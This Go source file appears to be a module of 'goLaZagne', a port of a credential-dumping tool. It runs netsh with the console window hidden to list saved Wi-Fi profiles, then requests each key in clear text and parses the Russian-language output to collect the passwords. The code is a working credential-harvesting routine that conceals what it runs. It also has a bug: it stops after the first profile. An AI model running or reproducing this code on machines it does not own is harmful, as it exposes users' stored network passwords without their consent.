package wifi

import (
	"os/exec"
	"syscall"
	"github.com/aglyzov/charmap"
	"strings"
	"fmt"
	"goLaZagne/common"
)

func ExecCommand(command string, params []string) string{
	cmd_li := exec.Command(command, params...)
	cmd_li.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} //Это необходимо для того что бы CMD запускалось в скрытом режиме
	output, _ := cmd_li.Output()
	if output != nil && len(output) > 0 {
		output = charmap.CP866_to_UTF8(output)
	}
	return string(output)
}

func WifiExtractDataRun() common.ExtractDataResult{
	params := []string{
		"wlan",
		"show",
		"profiles",
	}

	var output = ExecCommand("netsh", params)
	var lines = strings.Split(output, "\r\n")
	var users []string

	for i:=range lines{
		if strings.Contains(lines[i], "профили пользователей"){ //TODO ENGLISH
			users = append(users, strings.TrimSpace(strings.Split(lines[i], ":")[1]))
		}
	}
	//WTF? Missing values
	for i:=0; i < len(users); i++{
		var paramWifi = []string{
			"wlan",
			"show",
			"profile",
			users[i],
			"key=clear",
		}

		var Result common.ExtractDataResult
		var output = ExecCommand("netsh", paramWifi)
		var lines = strings.Split(output, "\r\n")
		var data []string
		for j:=range lines{
			if strings.Contains(lines[j], "Содержимое ключа"){ //TODO Английский

				data = append(data, fmt.Sprintf("%s %s", users[i], strings.TrimSpace(strings.Split(lines[j], ":")[1])))
			}
		}
		if len(data) == 0 {
			Result.Success = false
			return Result
		}
		Result.Data = data
		Result.Success = true
		return Result
	}
	return common.ExtractDataResult{false, []string{""}}
}
